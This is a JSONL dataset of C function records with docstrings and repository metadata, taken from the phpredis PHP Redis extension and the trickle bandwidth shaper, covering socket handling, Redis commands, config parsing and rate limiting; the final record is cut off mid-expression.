{"docstring": "/**\n * redis_sock_disconnect\n */\n", "func_signal": "PHPAPI int redis_sock_disconnect(RedisSock *redis_sock TSRMLS_DC)", "code": "{\n    if (redis_sock == NULL) {\n\t    return 1;\n    }\n\n    if (redis_sock->stream != NULL) {\n\t\t\tif (!redis_sock->persistent) {\n\t\t\t\tredis_sock_write(redis_sock, \"QUIT\", sizeof(\"QUIT\") - 1 TSRMLS_CC);\n\t\t\t}\n\n\t\t\tredis_sock->status = REDIS_SOCK_STATUS_DISCONNECTED;\n\t\t\tif(redis_sock->stream && !redis_sock->persistent) { /* still valid after the write? */\n\t\t\t\tphp_stream_close(redis_sock->stream);\n\t\t\t}\n\t\t\tredis_sock->stream = NULL;\n\n\t\t\treturn 1;\n    }\n\n    return 0;\n}", "path": "library.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/**\n * PHP_MINFO_FUNCTION\n */\n", "func_signal": "PHP_MINFO_FUNCTION(redis)", "code": "{\n    php_info_print_table_start();\n    php_info_print_table_header(2, \"Redis Support\", \"enabled\");\n    php_info_print_table_row(2, \"Redis Version\", PHP_REDIS_VERSION);\n    php_info_print_table_end();\n}", "path": "redis.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/**\n * redis_sock_read_multibulk_reply\n */\n", "func_signal": "PHPAPI int redis_sock_read_multibulk_reply(INTERNAL_FUNCTION_PARAMETERS, RedisSock *redis_sock, zval *z_tab, void *ctx)", "code": "{\n    char inbuf[1024];\n\n    if(-1 == redis_check_eof(redis_sock TSRMLS_CC)) {\n        return -1;\n    }\n    if(php_stream_gets(redis_sock->stream, inbuf, 1024) == NULL) {\n\t\tredis_stream_close(redis_sock TSRMLS_CC);\n        redis_sock->stream = NULL;\n        redis_sock->status = REDIS_SOCK_STATUS_FAILED;\n        redis_sock->mode = ATOMIC;\n        zend_throw_exception(redis_exception_ce, \"read error on connection\", 0 TSRMLS_CC);\n        return -1;\n    }\n\n    if(inbuf[0] != '*') {\n        return -1;\n    }\n    int numElems = atoi(inbuf+1);\n    zval *z_multi_result;\n    MAKE_STD_ZVAL(z_multi_result);\n    array_init(z_multi_result); /* pre-allocate array for multi's results. */\n\n    redis_sock_read_multibulk_reply_loop(INTERNAL_FUNCTION_PARAM_PASSTHRU,\n                    redis_sock, z_multi_result, numElems, 1);\n\n    IF_MULTI_OR_PIPELINE() {\n        add_next_index_zval(z_tab, z_multi_result);\n    } else {\n        *return_value = *z_multi_result;\n        efree(z_multi_result);\n    }\n    //zval_copy_ctor(return_value);\n    return 0;\n}", "path": "library.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/**\n * redis_free_socket\n */\n", "func_signal": "PHPAPI void redis_free_socket(RedisSock *redis_sock)", "code": "{\n    if(redis_sock->prefix) {\n\t\tefree(redis_sock->prefix);\n\t}\n    efree(redis_sock->host);\n    efree(redis_sock);\n}", "path": "library.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/**\n * redis_sock_server_open\n */\n", "func_signal": "PHPAPI int redis_sock_server_open(RedisSock *redis_sock, int force_connect TSRMLS_DC)", "code": "{\n    int res = -1;\n\n    switch (redis_sock->status) {\n        case REDIS_SOCK_STATUS_DISCONNECTED:\n            return redis_sock_connect(redis_sock TSRMLS_CC);\n        case REDIS_SOCK_STATUS_CONNECTED:\n            res = 0;\n        break;\n        case REDIS_SOCK_STATUS_UNKNOWN:\n            if (force_connect > 0 && redis_sock_connect(redis_sock TSRMLS_CC) < 0) {\n                res = -1;\n            } else {\n                res = 0;\n\n                redis_sock->status = REDIS_SOCK_STATUS_CONNECTED;\n            }\n        break;\n    }\n\n    return res;\n}", "path": "library.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/* }}} */\n", "func_signal": "PHP_METHOD(Redis, lInsert)", "code": "{\n\n\tzval *object;\n\tRedisSock *redis_sock;\n\tchar *pivot, *position, *key, *val, *cmd;\n\tint pivot_len, position_len, key_len, val_len, cmd_len;\n    int val_free, pivot_free, key_free;\n    zval *z_value, *z_pivot;\n\t\n\n\tif (zend_parse_method_parameters(ZEND_NUM_ARGS() TSRMLS_CC, getThis(), \"Osszz\",\n\t\t\t\t\t&object, redis_ce,\n\t\t\t\t\t&key, &key_len, \n\t\t\t\t\t&position, &position_len,\n\t\t\t\t\t&z_pivot,\n\t\t\t\t\t&z_value) == FAILURE) {\n\t\tRETURN_NULL();\n\t}\n\n\tif (redis_sock_get(object, &redis_sock TSRMLS_CC) < 0) {\n\t\tRETURN_FALSE;\n\t}\n\t\n\tif(strncasecmp(position, \"after\", 5) == 0 || strncasecmp(position, \"before\", 6) == 0) {\n\n\t\tkey_free = redis_key_prefix(redis_sock, &key, &key_len);\n        val_free = redis_serialize(redis_sock, z_value, &val, &val_len TSRMLS_CC);\n        pivot_free = redis_serialize(redis_sock, z_pivot, &pivot, &pivot_len TSRMLS_CC);\n        cmd_len = redis_cmd_format_static(&cmd, \"LINSERT\", \"ssss\", key, key_len, position, position_len, pivot, pivot_len, val, val_len);\n        if(val_free) efree(val);\n\t\tif(key_free) efree(key);\n        if(pivot_free) efree(pivot);\n\n\t\tREDIS_PROCESS_REQUEST(redis_sock, cmd, cmd_len); \n\t\tIF_ATOMIC() { \n\t\t\tredis_long_response(INTERNAL_FUNCTION_PARAM_PASSTHRU, redis_sock, NULL, NULL); \n\t\t} \n\t\tREDIS_PROCESS_RESPONSE(redis_long_response); \n\t} else {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_ERROR, \"Error on position\");\n\t}\n\t\n}", "path": "redis.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/**\n * Like multibulk reply, but don't touch the values, they won't be compressed. (this is used by HKEYS).\n */\n", "func_signal": "PHPAPI int redis_sock_read_multibulk_reply_raw(INTERNAL_FUNCTION_PARAMETERS, RedisSock *redis_sock, zval *z_tab, void *ctx)", "code": "{\n    char inbuf[1024];\n\n    if(-1 == redis_check_eof(redis_sock TSRMLS_CC)) {\n        return -1;\n    }\n    if(php_stream_gets(redis_sock->stream, inbuf, 1024) == NULL) {\n\t\tredis_stream_close(redis_sock TSRMLS_CC);\n        redis_sock->stream = NULL;\n        redis_sock->status = REDIS_SOCK_STATUS_FAILED;\n        redis_sock->mode = ATOMIC;\n        zend_throw_exception(redis_exception_ce, \"read error on connection\", 0 TSRMLS_CC);\n        return -1;\n    }\n\n    if(inbuf[0] != '*') {\n        return -1;\n    }\n    int numElems = atoi(inbuf+1);\n    zval *z_multi_result;\n    MAKE_STD_ZVAL(z_multi_result);\n    array_init(z_multi_result); /* pre-allocate array for multi's results. */\n\n    redis_sock_read_multibulk_reply_loop(INTERNAL_FUNCTION_PARAM_PASSTHRU,\n                    redis_sock, z_multi_result, numElems, 0);\n\n    IF_MULTI_OR_PIPELINE() {\n        add_next_index_zval(z_tab, z_multi_result);\n    } else {\n        *return_value = *z_multi_result;\n        efree(z_multi_result);\n    }\n    //zval_copy_ctor(return_value);\n    return 0;\n}", "path": "library.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/* }}} */\n", "func_signal": "PHPAPI void generic_rank_method(INTERNAL_FUNCTION_PARAMETERS, char *keyword, int keyword_len)", "code": "{\n    zval *object;\n    RedisSock *redis_sock;\n    char *key = NULL, *val = NULL, *cmd;\n    int key_len, val_len, cmd_len;\n    int val_free, key_free = 0;\n    zval *z_value;\n\n    if (zend_parse_method_parameters(ZEND_NUM_ARGS() TSRMLS_CC, getThis(), \"Osz\",\n                                     &object, redis_ce, &key, &key_len,\n                                     &z_value) == FAILURE) {\n        RETURN_FALSE;\n    }\n\n    if (redis_sock_get(object, &redis_sock TSRMLS_CC) < 0) {\n        RETURN_FALSE;\n    }\n\n    val_free = redis_serialize(redis_sock, z_value, &val, &val_len TSRMLS_CC);\n\tkey_free = redis_key_prefix(redis_sock, &key, &key_len);\n    cmd_len = redis_cmd_format_static(&cmd, keyword, \"ss\", key, key_len, val, val_len);\n    if(val_free) efree(val);\n    if(key_free) efree(key);\n\n\tREDIS_PROCESS_REQUEST(redis_sock, cmd, cmd_len);\n\tIF_ATOMIC() {\n\t    redis_long_response(INTERNAL_FUNCTION_PARAM_PASSTHRU, redis_sock, NULL, NULL);\n\t}\n\tREDIS_PROCESS_RESPONSE(redis_long_response);\n}", "path": "redis.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/* discard */\n", "func_signal": "PHP_METHOD(Redis, discard)", "code": "{\n    RedisSock *redis_sock;\n    char *cmd;\n\tint response_len, cmd_len;\n\tchar * response;\n\tzval *object;\n\n\tif (zend_parse_method_parameters(ZEND_NUM_ARGS() TSRMLS_CC, getThis(), \"O\",\n                                     &object, redis_ce) == FAILURE) {\n        RETURN_FALSE;\n    }\n\n    if (redis_sock_get(object, &redis_sock TSRMLS_CC) < 0) {\n        RETURN_FALSE;\n    }\n\n\tredis_sock->mode = ATOMIC;\n\n    cmd_len = redis_cmd_format_static(&cmd, \"DISCARD\", \"\");\n\n    if (redis_sock_write(redis_sock, cmd, cmd_len TSRMLS_CC) < 0) {\n        efree(cmd);\n        RETURN_FALSE;\n    }\n    efree(cmd);\n\n    if ((response = redis_sock_read(redis_sock, &response_len TSRMLS_CC)) == NULL) {\n        RETURN_FALSE;\n    }\n\n\tif(response_len == 3 && strncmp(response, \"+OK\", 3) == 0) {\n\t\tRETURN_TRUE;\n\t}\n\tRETURN_FALSE;\n}", "path": "redis.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/* hDel */\n", "func_signal": "PHP_METHOD(Redis, hDel)", "code": "{\n    char *cmd;\n    int cmd_len;\n    RedisSock *redis_sock = generic_hash_command_2(INTERNAL_FUNCTION_PARAM_PASSTHRU, \"HDEL\", 4, &cmd, &cmd_len);\n\n\tREDIS_PROCESS_REQUEST(redis_sock, cmd, cmd_len);\n\tIF_ATOMIC() {\n\t\tredis_1_response(INTERNAL_FUNCTION_PARAM_PASSTHRU, redis_sock, NULL, NULL);\n\t}\n\tREDIS_PROCESS_RESPONSE(redis_1_response);\n\n}", "path": "redis.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/** \n *\tunsubscribe channel_0 channel_1 ... channel_n\n *  unsubscribe(array(channel_0, channel_1, ..., channel_n))\n * response format :\n * array(\n * \tchannel_0 => TRUE|FALSE,\n *\tchannel_1 => TRUE|FALSE,\n *\t...\n *\tchannel_n => TRUE|FALSE\n * );\n **/\n", "func_signal": "PHP_METHOD(Redis, unsubscribe)", "code": "{\n    zval *object, *array, **data;\n    HashTable *arr_hash;\n    HashPosition pointer;\n    RedisSock *redis_sock;\n    char *cmd = \"\", *old_cmd = NULL;\n    int cmd_len, array_count;\n\t\n\tif (zend_parse_method_parameters(ZEND_NUM_ARGS() TSRMLS_CC, getThis(), \"Oa\", \n\t\t\t\t\t\t\t\t\t &object, redis_ce, &array) == FAILURE) {\n\t\tRETURN_FALSE;\t\n\t}\n    if (redis_sock_get(object, &redis_sock TSRMLS_CC) < 0) {\n        RETURN_FALSE;\n    }\n\n    arr_hash    = Z_ARRVAL_P(array);\n    array_count = zend_hash_num_elements(arr_hash);\n\n    if (array_count == 0) {\n        RETURN_FALSE;\n    }\n\n    for (zend_hash_internal_pointer_reset_ex(arr_hash, &pointer);\n         zend_hash_get_current_data_ex(arr_hash, (void**) &data,\n                                       &pointer) == SUCCESS;\n         zend_hash_move_forward_ex(arr_hash, &pointer)) {\n\n        if (Z_TYPE_PP(data) == IS_STRING) {\n            char *old_cmd = NULL;\n            if(*cmd) {\n                old_cmd = cmd;\n            }\n            cmd_len = spprintf(&cmd, 0, \"%s %s\", cmd, Z_STRVAL_PP(data));\n            if(old_cmd) {\n                efree(old_cmd);\n            }\n        }\n    }\n\n    old_cmd = cmd;\n    cmd_len = spprintf(&cmd, 0, \"UNSUBSCRIBE %s\\r\\n\", cmd);\n    efree(old_cmd);\n\n    if (redis_sock_write(redis_sock, cmd, cmd_len TSRMLS_CC) < 0) {\n        efree(cmd);\n        RETURN_FALSE;\n    }\n    efree(cmd);\n\n\tint i = 1;\n\tzval *z_tab, **z_channel;\n\n\tarray_init(return_value);\n\n\twhile( i <= array_count) {\n\t    z_tab = redis_sock_read_multibulk_reply_zval(INTERNAL_FUNCTION_PARAM_PASSTHRU, redis_sock);\n\n\t\tif(Z_TYPE_P(z_tab) == IS_ARRAY) { \n\t\t\tif (zend_hash_index_find(Z_ARRVAL_P(z_tab), 1, (void**)&z_channel) == FAILURE) {\n\t\t\t\tRETURN_FALSE;\n\t\t\t}\t\t\n\t\t\tadd_assoc_bool(return_value, Z_STRVAL_PP(z_channel), 1);\n\t\t} else {\n\t\t\t//error\n\t\t\tefree(z_tab);\n\t\t\tRETURN_FALSE;\n\t\t}\n\t\tefree(z_tab);\n\t\ti ++;\n\t}\n}", "path": "redis.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/**\n * redis_sock_get\n */\n", "func_signal": "PHPAPI int redis_sock_get(zval *id, RedisSock **redis_sock TSRMLS_DC)", "code": "{\n\n    zval **socket;\n    int resource_type;\n\n    if (Z_TYPE_P(id) != IS_OBJECT || zend_hash_find(Z_OBJPROP_P(id), \"socket\",\n                                  sizeof(\"socket\"), (void **) &socket) == FAILURE) {\n        return -1;\n    }\n\n    *redis_sock = (RedisSock *) zend_list_find(Z_LVAL_PP(socket), &resource_type);\n\n    if (!*redis_sock || resource_type != le_redis_sock) {\n            return -1;\n    }\n\n    return Z_LVAL_PP(socket);\n}", "path": "redis.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/* hExists */\n", "func_signal": "PHP_METHOD(Redis, hExists)", "code": "{\n    char *cmd;\n    int cmd_len;\n    RedisSock *redis_sock = generic_hash_command_2(INTERNAL_FUNCTION_PARAM_PASSTHRU, \"HEXISTS\", 7, &cmd, &cmd_len);\n\n\tREDIS_PROCESS_REQUEST(redis_sock, cmd, cmd_len);\n\tIF_ATOMIC() {\n\t  redis_1_response(INTERNAL_FUNCTION_PARAM_PASSTHRU, redis_sock, NULL, NULL);\n\t}\n\tREDIS_PROCESS_RESPONSE(redis_1_response);\n\n}", "path": "redis.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/**\n * redis_sock_read_bulk_reply\n */\n", "func_signal": "PHPAPI char *redis_sock_read_bulk_reply(RedisSock *redis_sock, int bytes TSRMLS_DC)", "code": "{\n    int offset = 0;\n    size_t got;\n\n    char * reply;\n\n    if(-1 == redis_check_eof(redis_sock TSRMLS_CC)) {\n        return NULL;\n    }\n\n    if (bytes == -1) {\n        return NULL;\n    } else {\n        reply = emalloc(bytes+1);\n\n        while(offset < bytes) {\n            got = php_stream_read(redis_sock->stream, reply + offset, bytes-offset);\n            offset += got;\n        }\n        char c;\n        int i;\n        for(i = 0; i < 2; i++) {\n            php_stream_read(redis_sock->stream, &c, 1);\n        }\n    }\n\n    reply[bytes] = 0;\n    return reply;\n}", "path": "library.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/**\n * redis_sock_connect\n */\n", "func_signal": "PHPAPI int redis_sock_connect(RedisSock *redis_sock TSRMLS_DC)", "code": "{\n    struct timeval tv, *tv_ptr = NULL;\n    char *host = NULL, *persistent_id = NULL, *errstr = NULL;\n    int host_len, err = 0;\n\n    if (redis_sock->stream != NULL) {\n        redis_sock_disconnect(redis_sock TSRMLS_CC);\n    }\n\n    tv.tv_sec  = (time_t)redis_sock->timeout;\n    tv.tv_usec = (int)((redis_sock->timeout - tv.tv_sec) * 1000000);\n    if(tv.tv_sec != 0 || tv.tv_usec != 0) {\n\t    tv_ptr = &tv;\n    }\n\n    if(redis_sock->host[0] == '/' && redis_sock->port < 1) {\n\t    host_len = spprintf(&host, 0, \"unix://%s\", redis_sock->host);\n    } else {\n\t    host_len = spprintf(&host, 0, \"%s:%d\", redis_sock->host, redis_sock->port);\n    }\n\n    if (redis_sock->persistent) {\n      spprintf(&persistent_id, 0, \"%s:%f\", host, redis_sock->timeout);\n    }\n\n    redis_sock->stream = php_stream_xport_create(host, host_len, ENFORCE_SAFE_MODE,\n\t\t\t\t\t\t\t STREAM_XPORT_CLIENT\n\t\t\t\t\t\t\t | STREAM_XPORT_CONNECT,\n\t\t\t\t\t\t\t persistent_id, tv_ptr, NULL, &errstr, &err\n\t\t\t\t\t\t\t);\n\n    if (persistent_id) {\n      efree(persistent_id);\n    }\n\n    efree(host);\n\n    if (!redis_sock->stream) {\n        efree(errstr);\n        return -1;\n    }\n\n    /* set TCP_NODELAY */\n    php_netstream_data_t *sock = (php_netstream_data_t*)redis_sock->stream->abstract;\n    int tcp_flag = 1;\n    setsockopt(sock->socket, IPPROTO_TCP, TCP_NODELAY, (char *) &tcp_flag, sizeof(int));\n\n    php_stream_auto_cleanup(redis_sock->stream);\n\n    if(tv.tv_sec != 0) {\n        php_stream_set_option(redis_sock->stream, PHP_STREAM_OPTION_READ_TIMEOUT,\n                              0, &tv);\n    }\n    php_stream_set_option(redis_sock->stream,\n                          PHP_STREAM_OPTION_WRITE_BUFFER,\n                          PHP_STREAM_BUFFER_NONE, NULL);\n\n    redis_sock->status = REDIS_SOCK_STATUS_CONNECTED;\n\n    return 0;\n}", "path": "library.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/* }}} */\n", "func_signal": "PHPAPI void generic_empty_cmd(INTERNAL_FUNCTION_PARAMETERS, char *cmd, int cmd_len, ...)", "code": "{\n    zval *object;\n    RedisSock *redis_sock;\n\n    if (zend_parse_method_parameters(ZEND_NUM_ARGS() TSRMLS_CC, getThis(), \"O\",\n                                     &object, redis_ce) == FAILURE) {\n        RETURN_FALSE;\n    }\n\n    if (redis_sock_get(object, &redis_sock TSRMLS_CC) < 0) {\n        RETURN_FALSE;\n    }\n\n\tREDIS_PROCESS_REQUEST(redis_sock, cmd, cmd_len);\n    IF_ATOMIC() {\n\t  redis_boolean_response(INTERNAL_FUNCTION_PARAM_PASSTHRU, redis_sock, NULL, NULL);\n    }\n    REDIS_PROCESS_RESPONSE(redis_boolean_response);\n}", "path": "redis.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/* }}} */\n", "func_signal": "PHPAPI RedisSock*\ngeneric_hash_command_2(INTERNAL_FUNCTION_PARAMETERS, char *keyword, int keyword_len, char **out_cmd, int *out_len)", "code": "{\n\n    zval *object;\n    RedisSock *redis_sock;\n    char *key = NULL, *cmd, *member;\n    int key_len, cmd_len, member_len;\n\n    if (zend_parse_method_parameters(ZEND_NUM_ARGS() TSRMLS_CC, getThis(), \"Oss\",\n                                     &object, redis_ce,\n                                     &key, &key_len, &member, &member_len) == FAILURE) {\n            ZVAL_BOOL(return_value, 0);\n            return NULL;\n    }\n\n    if (redis_sock_get(object, &redis_sock TSRMLS_CC) < 0) {\n            ZVAL_BOOL(return_value, 0);\n            return NULL;\n    }\n\tint key_free = redis_key_prefix(redis_sock, &key, &key_len);\n    cmd_len = redis_cmd_format_static(&cmd, keyword, \"ss\", key, key_len, member, member_len);\n\tif(key_free) efree(key);\n\n    *out_cmd = cmd;\n    *out_len = cmd_len;\n    return redis_sock;\n}", "path": "redis.c", "repo_name": "owlient/phpredis", "stars": 382, "license": "None", "language": "c", "size": 1927}
{"docstring": "/* Queue a remove section operation.  */\n", "func_signal": "int\nconf_remove_section (int transaction, char *section)", "code": "{\n\tstruct conf_trans *node;\n\n\tnode = conf_trans_node (transaction, CONF_REMOVE_SECTION);\n\tif (!node)\n\t\tgoto fail;\n\tnode->section = strdup (section);\n\tif (!node->section) {\n\t\twarn(\"conf_remove_section: strdup (\\\"%s\\\") failed\", section);\n\t\tgoto fail;\n\t}\n\treturn (0);\n\n fail:\n\tif (node)\n\t\tfree (node);\n\treturn (1);\n}", "path": "conf.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/* 0 */\n", "func_signal": "void\nclient_update(struct client *cli, short which, size_t len)", "code": "{\n\tstruct bwstat_data *bsd = &cli->stat->data[which];\n\n\twarnxv(4, \"Statistics (%s) for %d (%s/%s):\",\n\t    which == TRICKLE_SEND ? \"SEND\" : \"RECV\",\n\t    cli->pid, cli->argv0, cli->uname);\n\n#if 0\n\t/* XXX for benchmarking. */\n\tif (which == TRICKLE_SEND) {\n\t\tstruct timeval tv, xtv;\n\t\tstatic struct timeval begtv;\n\n\t\tgettimeofday(&tv, NULL);\n\n\t\tif (!timerisset(&begtv)) {\n\t\t\tbegtv = tv;\n\t\t\treturn;\n\t\t}\n\n\t\twarnxv(4, \"DATA %f %d.%d %d.%d\",\n\t\t    difftv(&tv, &begtv),\n\t\t    bsd->rate / 1024, (bsd->rate % 1024) * 100 / 1024,\n\t\t    bsd->winrate / 1024, (bsd->winrate % 1024) * 100 / 1024);\n\t}\n#endif /* 0 */\n\n\tbwstat_update(cli->stat, len, which);\n\n\twarnxv(4, \"\\tavg: %d.%d KB/s; win: %d.%d KB/s\", \n\t    bsd->rate / 1024, (bsd->rate % 1024) * 100 / 1024,\n\t    bsd->winrate / 1024, (bsd->winrate % 1024) * 100 / 1024);\n}", "path": "client.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/* Open the config file and map it into our address space, then parse it.  */\n", "func_signal": "void\nconf_reinit (void)", "code": "{\n\tstruct conf_binding *cb = 0;\n\tint fd, i, trans;\n\toff_t sz;\n\tchar *new_conf_addr = 0;\n\tstruct stat sb;\n\n\tif ((stat (conf_path, &sb) == 0) || (errno != ENOENT)) {\n\t\tsz = sb.st_size;\n\t\tfd = open (conf_path, O_RDONLY);\n\t\tif (fd == -1) {\n\t\t\twarn(\"conf_reinit: open (\\\"%s\\\", O_RDONLY) failed\",\n\t\t\t     conf_path);\n\t\t\treturn;\n\t\t}\n\n\t\tnew_conf_addr = malloc (sz);\n\t\tif (!new_conf_addr) {\n\t\t\twarn(\"conf_reinit: malloc (%d) failed\", (int)sz);\n\t\t\tgoto fail;\n\t\t}\n\n\t\t/* XXX I assume short reads won't happen here.  */\n\t\tif (read(fd, new_conf_addr, sz) != sz) {\n\t\t\twarn(\"conf_reinit: read (%d, %p, %d) failed\",\n\t\t\t     fd, new_conf_addr, (int)sz);\n\t\t\tgoto fail;\n\t\t}\n\t\tclose (fd);\n\n\t\ttrans = conf_begin ();\n\n\t\t/* XXX Should we not care about errors and rollback?  */\n\t\tconf_parse (trans, new_conf_addr, sz);\n\t}\n\telse\n\t\ttrans = conf_begin ();\n\n\t/* Load default configuration values.  */\n\tconf_load_defaults (trans);\n\n\t/* Free potential existing configuration.  */\n\tif (conf_addr) {\n\t\tfor (i = 0;\n\t\t     i < sizeof conf_bindings / sizeof conf_bindings[0]; i++)\n\t\t\tfor (cb = LIST_FIRST (&conf_bindings[i]); cb;\n\t\t\t     cb = LIST_FIRST (&conf_bindings[i]))\n\t\t\t\tconf_remove_now (cb->section, cb->tag);\n\t\tfree (conf_addr);\n\t}\n\n\tconf_end (trans, 1);\n\tconf_addr = new_conf_addr;\n\treturn;\n\n fail:\n\tif (new_conf_addr)\n\t\tfree (new_conf_addr);\n\tclose (fd);\n}", "path": "conf.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/*\n * Build a list of string values out of the comma separated value denoted by\n * TAG in SECTION.\n */\n", "func_signal": "struct conf_list *\nconf_get_list (char *section, char *tag)", "code": "{\n\tchar *liststr = 0, *p, *field;\n\tstruct conf_list *list = 0;\n\tstruct conf_list_node *node;\n\n\tlist = malloc (sizeof *list);\n\tif (!list)\n\t\tgoto cleanup;\n\tTAILQ_INIT (&list->fields);\n\tlist->cnt = 0;\n\tliststr = conf_get_str (section, tag);\n\tif (!liststr)\n\t\tgoto cleanup;\n\tliststr = strdup (liststr);\n\tif (!liststr)\n\t\tgoto cleanup;\n\tp = liststr;\n\twhile ((field = (char*)strsep (&p, \", \\t\")) != NULL) {\n\t\tif (*field == '\\0') {\n\t\t\twarnx(\"conf_get_list: empty field, ignoring...\");\n\t\t\tcontinue;\n\t\t}\n\t\tlist->cnt++;\n\t\tnode = calloc (1, sizeof *node);\n\t\tif (!node)\n\t\t\tgoto cleanup;\n\t\tnode->field = strdup (field);\n\t\tif (!node->field)\n\t\t\tgoto cleanup;\n\t\tTAILQ_INSERT_TAIL (&list->fields, node, link);\n\t}\n\tfree (liststr);\n\treturn (list);\n\n cleanup:\n\tif (list)\n\t\tconf_free_list (list);\n\tif (liststr)\n\t\tfree (liststr);\n\treturn (0);\n}", "path": "conf.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/* Validate X according to the range denoted by TAG in section SECTION.  */\n", "func_signal": "int\nconf_match_num (char *section, char *tag, int x)", "code": "{\n\tchar *value = conf_get_str (section, tag);\n\tint val, min, max, n;\n\n\tif (!value)\n\t\treturn (0);\n\tn = sscanf (value, \"%d,%d:%d\", &val, &min, &max);\n\tswitch (n) {\n\tcase 1:\n\t\treturn (x == val);\n\tcase 3:\n\t\treturn (min <= x && max >= x);\n\tdefault:\n\t\twarn(\"conf_match_num: section %s tag %s: \"\n\t\t     \"invalid number spec %s\", section, tag, value);\n\t}\n\treturn (0);\n}", "path": "conf.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/* From OpenSSH */\n", "func_signal": "char *\nget_progname(char *argv0)", "code": "{\n#ifdef HAVE___PROGNAME\n        extern char *__progname;\n\n        return __progname;\n#else\n        char *p;\n\n        if (argv0 == NULL)\n                return \"unknown\";       /* XXX */\n        p = strrchr(argv0, '/');\n        if (p == NULL)\n                p = argv0;\n        else\n                p++;\n        return p;\n#endif\n}", "path": "util.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/*\n * Return the numeric value denoted by TAG in section SECTION or DEF\n * if that tag does not exist.\n */\n", "func_signal": "int\nconf_get_num (char *section, char *tag, int def)", "code": "{\n\tchar *value = conf_get_str (section, tag);\n\n\tif (value)\n\t\treturn (atoi (value));\n\treturn (def);\n}", "path": "conf.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/*\n * Return required delay for bs for direction which.\n */\n", "func_signal": "struct timeval *\nbwstat_getdelay(struct bwstat *bs, size_t *len, uint lim, short which)", "code": "{\n\tuint rate = 0, npts = 0, ent;\n\tint ncli = 0, pool = 0, xent;\n\tdouble delay;\n\tstatic struct timeval tv;\n\tstruct bwstathead poolq;\n\tstruct bwstat *xbs, *bstot = TAILQ_FIRST(&statq);\n\tuint initent;\n\tsize_t xlen = *len;\n\n\tif (*len == 0)\n\t\treturn (NULL);\n\n\tmemset(&tv, 0, sizeof(tv));\n\n\tTAILQ_INIT(&poolq);\n\n\trate = bstot->data[which].winrate;\n\n\tif (rate <= lim)\n\t\treturn (NULL);\n\n\txbs = bstot;\n\twhile ((xbs = TAILQ_NEXT(xbs, next)) != NULL) {\n\t\tncli++;\n\t\tnpts += xbs->pts;\n\t\tTAILQ_INSERT_TAIL(&poolq, xbs, qnext);\n\t}\n\n\tif (ncli == 0)\n\t\treturn (NULL);\n\n\t/* Entitlement per point */\n\tinitent = ent = lim / npts;\n\n\tif (ent == 0)\n\t\t;\t\t/*\n\t\t\t\t * XXX we have surpassed our\n\t\t\t\t * granularity.\n\t\t\t\t */\n\n\t/*\n\t * Sprinkle some bandwidth: increase the value of a point\n\t * until everyone is satisfied.\n\t */\n\tdo {\n\t\t/* Take from the poor ... */\n\t\tTAILQ_FOREACH(xbs, &poolq, qnext)\n\t\t\tif (xbs->data[which].winrate < ent * xbs->pts) {\n\t\t\t\tpool += ent * xbs->pts -\n\t\t\t\t    xbs->data[which].winrate;\n\t\t\t\tncli--;\n\t\t\t\tnpts -= xbs->pts;\n\t\t\t\tTAILQ_REMOVE(&poolq, xbs, qnext);\n\t\t\t}\n\n\t\t/* And give to the rich ... */\n\t\tif (ncli > 0) {\n\t\t\txent = pool / npts;\n\n\t\t\tif (xent <= 0)\n\t\t\t\tbreak;\n\n\t\t\tTAILQ_FOREACH(xbs, &poolq, qnext)\n\t\t\t\tif (xbs->data[which].winrate > ent * xbs->pts)\n\t\t\t\t\tpool -= xent * xbs->pts;\n\n\t\t\tent += xent;\n\t\t}\n\t} while (pool > 0 && ncli > 0);\n\n\t/*\n\t * This is the case of a client that is not using its limit.\n\t * We reset ent in this case.  The rest will adjust itself\n\t * over time.\n\t */\n\tif (ent * bs->pts > lim)\n\t\tent = lim / bs->pts;\n\n\tif (bs->data[which].winrate > ent * bs->pts)\n\t\tdelay = (1.0 * *len) / (1.0 * ent * bs->pts);\n\telse\n\t\tdelay = 0.0;\n\n/*\tif (delay > bs->tsmooth) {  */\n\t\tif ((*len = ent * bs->pts * bs->tsmooth) == 0) {\n\t\t\t*len = bs->lsmooth;\n\t\t\tdelay = (1.0 * *len) / (1.0 * ent * bs->pts);\n\t\t} else\n\t\t\tdelay = bs->tsmooth;\n/*\t} */\n\n\tif (*len > xlen) {\n\t\t*len = xlen;\n\t\tdelay = (1.0 * *len) / 